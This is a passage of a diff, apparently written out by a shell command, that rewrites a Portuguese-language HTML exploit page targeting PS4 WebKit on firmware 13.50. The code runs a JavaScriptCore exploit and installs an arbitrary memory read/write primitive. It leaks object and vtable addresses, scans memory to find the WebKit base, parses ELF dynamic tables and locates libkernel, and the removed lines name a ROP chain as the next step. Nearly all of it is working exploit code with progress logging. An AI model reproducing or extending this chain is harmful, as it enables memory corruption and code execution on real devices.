+    if (t && t.length>10) { log('[+] maps acessível', 'ok'); log(t.slice(0,2000),'d'); }
+    else throw 0;
+  } catch(_) { log('[-] /proc/self/maps bloqueado (sandbox ativo)', 'w'); }
 
-    const isOk  = tag.includes('UP') || tag.includes('OK') || tag.includes('SUCCESS');
-    const isErr = tag.includes('FAIL') || tag.includes('ERROR') || tag.includes('GIVE-UP');
-    const cls   = isOk ? 'log-ok' : isErr ? 'log-error' : 'log-info';
+  /* FASE 2 — ctor */
+  logH('FASE 2 — ponteiro inicial no WebKit');
+  const ctorRaw = globalThis.__ps5NativeCtor;
+  let ctorPtr = null;
+  if (typeof ctorRaw === 'number' && ctorRaw > 0x100000000) {
+    ctorPtr = n64(ctorRaw);
+    log('[+] __ps5NativeCtor: 0x' + ctorPtr.toString(), 'ok');
+    setCard('c-ct', '0x' + ctorPtr.toString());
+    document.getElementById('cards').classList.add('v');
+  } else {
+    log('[-] __ps5NativeCtor não disponível', 'w');
+  }
 
-    log(`[${tag}] ${detail}`, cls);
+  /* FASE 2.5 — OFFSET SCANNER */
+  logH('FASE 2.5 — Offset Scanner (VTable Slots)');
+  const ta      = document.createElement('textarea');
+  const objAddr = p.leakval(ta);
+  log('[*] textarea JSCell @ 0x' + objAddr.toString(), 'd');
+
+  // Read vtable at offset 0x10 (PS4 confirmed)
+  const vtable = r8(p, objAddr.add32(0x10));
+  if (!validPtr(vtable)) {
+    log('[-] vtable inválida em offset 0x10', 'e');
+    return;
+  }
+  log('[+] vtable @ 0x' + vtable.toString(), 'ok');
+
+  // Run offset scanner → fills table, finds min fn ptr
+  const anchor = runOffsetScanner(p, vtable, ctorPtr);
+  if (!anchor) {
+    log('[-] Nenhum fn ptr válido na vtable', 'e');
+    return;
+  }
+
+  // Check if we have a manual RVA stored
+  const manualRva = parseInt(localStorage.getItem('ps4_manual_rva') || '0');
+  if (manualRva > 0 && ctorPtr) {
+    log('[+] RVA manual encontrado: 0x' + manualRva.toString(16), 'ok');
+    const base = n64(i64n(ctorPtr) - manualRva);
+    log('[+] Base via RVA manual: 0x' + base.toString(), 'ok');
+    await afterBaseFound(p, base, ctorPtr, vtable);
+    return;
+  }
+
+  // Check crash recovery from PREVIOUS run
+  const recoveredBase = checkCrashRecovery(anchor);
+  if (recoveredBase) {
+    await afterBaseFound(p, recoveredBase, ctorPtr, vtable);
+    return;
+  }
+
+  /* FASE 3 — Crash-tolerant ELF scan */
+  logH('FASE 3 — ELF scan crash-tolerant (âncora .text)');
+  log('[!] âncora: 0x' + anchor.toString()
+    + ' (evita gap .rodata↔.text → sem crash de segmento)', 'w');
+  log('[!] Offset salvo antes de cada leitura → base via crash recovery', 'w');
+
+  const base = await crashTolerantScan(p, anchor, 'WebKit');
+  if (base) {
+    await afterBaseFound(p, base, ctorPtr, vtable);
+  }
 }
 
-// --- BOOT --------------------------------------------------------------------
+/* ─── após encontrar a base ─────────────────────────────── */
+async function afterBaseFound(p, base, ctorPtr, vtable) {
+  setProg(0, false);
+  setCard('c-wk', '0x' + base.toString());
+
+  // Compute RVAs
+  const baseN = i64n(base);
+  if (ctorPtr) {
+    const ctorRva = i64n(ctorPtr) - baseN;
+    setCard('c-rv', '+0x' + ctorRva.toString(16).toUpperCase());
+    showConstants(base, ctorPtr, vtable);
+  }
+
+  // Verify ELF magic
+  try {
+    const m = r4(p, base);
+    if (m === 0x464C457F) log('[+] ELF magic confirmado no base ✓', 'ok');
+    else log('[!] PS4 SPRX: sem ELF magic no base (header não mapeado)', 'w');
+  } catch(_) { log('[!] Leitura do base falhou — off by one?', 'w'); }
+
+  /* FASE 4 — parse DYNAMIC */
+  logH('FASE 4 — Parse ELF DYNAMIC');
+  let DT = null;
+  try {
+    DT = parseDynamic(p, base);
+    if (DT) {
+      const tags = { 3:'PLTGOT',5:'STRTAB',6:'SYMTAB',7:'RELA',
+                     8:'RELASZ',23:'JMPREL',2:'PLTRELSZ',11:'SYMENT' };
+      for (const [t, nm] of Object.entries(tags)) {
+        if (DT[t]) log('  ' + nm.padEnd(8) + ' +0x' + DT[t].toString(16), 'd');
+      }
+    }
+  } catch(e) { log('  parse erro: ' + e.message, 'w'); }
+
+  /* FASE 5 — libs */
+  logH('FASE 5 — Descoberta de bibliotecas via GOT');
+  if (!DT || !DT[3]) {
+    log('[-] DT_PLTGOT ausente — ELF parse falhou (base pode estar errada)', 'w');
+    log('[!] Possível: ctor_rva incorreto → tente ajuste manual abaixo', 'w');
+    document.getElementById('manual').style.display = 'block';
+    return;
+  }
+
+  const libs = await discoverLibs(p, base, DT);
+  log('[+] ' + libs.length + ' biblioteca(s) encontrada(s)', 'ok');
+
+  if (libs.length > 0) {
+    // Identify libkernel (lowest base = loaded first)
+    const sorted = [...libs].sort((a,b) => i64n(a.base)-i64n(b.base));
+    const lk = sorted[0];
+    setCard('c-lk', '0x' + lk.base.toString());
+    log('[+] libkernel (heurística): 0x' + lk.base.toString()
+      + '  ' + lk.soname, 'ok');
+  }
+
+  setStatus('Bases encontradas — window._exploit disponível', 'ok');
+  globalThis._exploit = { base, ctorPtr, vtable, libs, DT };
+}
+
+/* ─── constants display ─────────────────────────────────── */
+function showConstants(base, ctorPtr, vtable) {
+  const baseN = i64n(base);
+  const out   = [];
+
+  if (ctorPtr) {
+    const rv = i64n(ctorPtr) - baseN;
+    out.push('const WEBKIT_CTOR_RVA   = 0x' + rv.toString(16).toUpperCase()
+      + ';  // __ps5NativeCtor → base');
+    out.push('// uso: const wkBase = __ps5NativeCtor - WEBKIT_CTOR_RVA;');
+  }
+  if (vtable) {
+    const rv2 = i64n(vtable) - baseN;
+    out.push('');
+    out.push('const WEBKIT_VTABLE_RVA = 0x' + rv2.toString(16).toUpperCase()
+      + ';  // HTMLTextAreaElement vtable');
+    out.push('// vtable - ctor delta: 0x' + (i64n(vtable)-i64n(ctorPtr||vtable)).toString(16)
+      + ' (constante entre runs)');
+  }
+  out.push('');
+  out.push('// PS4 FW 13.50 — WebKit 605.1.15');
+
+  document.getElementById('c-out').textContent = out.join('\n');
+  document.getElementById('cbox').style.display = 'block';
+}
+
+/* ─── manual RVA entry ───────────────────────────────────── */
+window.applyManualRva = function() {
+  const v = parseInt(document.getElementById('inp-rva').value.trim(), 16);
+  if (v > 0 && v < 0x10000000) {
+    localStorage.setItem('ps4_manual_rva', String(v));
+    log('[!] RVA manual salvo (0x' + v.toString(16) + '). Recarregue.', 'w');
+  }
+};
+
+/* ─── BOOT ───────────────────────────────────────────────── */
 (async () => {
-    log(`UA: ${ua}`, 'log-dim');
-    log(`Firmware detectado: ${fwStr || 'desconhecido'}`, 'log-info');
-    log('', '');
+  setStatus('Executando exploit JSC...', 'r');
+  logH('EXPLOIT JSC (core.js)');
 
-    setStatus('Rodando exploit JSC (core.js)…', 'running');
-    log('-- EXPLOIT JSC (WebKit) ------------------------', 'log-section');
+  let carrier;
+  try {
+    carrier = await establishPrimitive({
+      onEvent(tag, det, att) {
+        document.getElementById('ba').textContent = 'tentativa: '+(att||'—');
+        document.getElementById('bg').textContent = tag.toLowerCase();
+        const v=['PAIR-REPROVED','PAIR-COMMIT','PAIR-WIDENED','PAIR-CELLS',
+                 'PAIR-IDENTITY-MAIN','PAIR-IDENTITY-WORKER','PAIR-MAIN-RECORD',
+                 'PAIR-RELEASE','PAIR-MAIN-CELL','PAIR-FAKE-BUTTERFLY'];
+        if(v.includes(tag)){log('  '+tag+': '+det,'d');return;}
+        const ok=tag.includes('UP')||tag.includes('OK');
+        log('['+tag+'] '+det, ok?'ok':'i');
+      },
+      maxAttempts: 0
+    });
+  } catch(err) {
+    setStatus('core.js falhou: '+err.message,'e');
+    log('[ERRO] '+err.message,'e'); return;
+  }
+  log('[+] Primitivo JSC estabelecido!', 'ok');
 
-    let carrier;
-    try {
-        carrier = await establishPrimitive({
-            onEvent: onCoreEvent,
-            maxAttempts: 0   // 0 = sem limite de tentativas
-        });
-    } catch (err) {
-        setStatus('core.js falhou: ' + err.message, 'error');
-        log('[ERRO] ' + err.message, 'log-error');
-        return;
-    }
+  logH('PRIMITIVA R/W (mem.js)');
+  setStatus('Instalando primitiva R/W...','r');
+  let p;
+  try {
+    p = installWindowP(carrier, {
+      promote: true,
+      onEvent(tag,det){ log('  [mem/'+tag+'] '+det,'d'); }
+    });
+  } catch(err) {
+    setStatus('mem.js falhou: '+err.message,'e');
+    log('[ERRO] '+err.message,'e'); return;
+  }
+  log('[+] R/W arbitrário: window.p instalado', 'ok');
+  window.p = p;
 
-    log('[+] core.js: exploit JSC concluído!', 'log-ok');
-    log('', '');
-    log('-- INSTALANDO PRIMITIVA R/W (mem.js) ----------', 'log-section');
-    setStatus('Instalando primitiva de memória…', 'running');
-
-    let p;
-    try {
-        p = installWindowP(carrier, {
-            promote: true,
-            onEvent: (tag, detail) => {
-                log(`  [mem/${tag}] ${detail}`, 'log-dim');
-            }
-        });
-    } catch (err) {
-        setStatus('mem.js falhou: ' + err.message, 'error');
-        log('[ERRO] ' + err.message, 'log-error');
-        return;
-    }
-
-    log('[+] R/W arbitrário: window.p instalado', 'log-ok');
-    log('', '');
-
-    setStatus('Vazando endereços base…', 'running');
-    log('-- LEAK DE BASES -------------------------------', 'log-section');
-
-    let bases;
-    try {
-        bases = await leakAllBases(p);
-    } catch (err) {
-        setStatus('leakAllBases falhou: ' + err.message, 'error');
-        log('[ERRO] ' + err.message, 'log-error');
-        return;
-    }
-
-    if (!bases) {
-        setStatus('Falha no leak de bases', 'error');
-        return;
-    }
-
-    setStatus('Bases vazadas com sucesso — próximo: ROP', 'ok');
-    log('', '');
-    log('Próximo passo: construir ROP chain com as bases acima.', 'log-info');
-    log('window._exploit contém todas as bases e símbolos.', 'log-dim');
+  await main(p);
 })();
-
 </script>
 </body>
 </html>
+HTMLEOF
+echo "Done: $(wc -l < /mnt/user-data/outputs/index.html) lines"
